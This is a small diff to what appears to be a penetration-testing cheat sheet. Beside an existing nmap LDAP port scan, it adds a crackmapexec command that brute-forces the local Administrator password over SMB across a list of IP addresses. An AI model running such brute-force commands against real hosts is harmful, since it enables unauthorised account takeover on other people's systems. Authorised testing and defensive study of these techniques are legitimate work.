@@ -51,6 +51,10 @@ date: 2022-12-10
 
     nmap -p389,636 --open -iL <IP_List_File>  #389(LDAP) / 636(LDAP-SSL)
     
+### Crackmapexec Local Administrator Brute Force Attack
+
+    crackmapexec smb <IP List File> -u Administrator -p <Password List File> -d .
+    
     
     
     
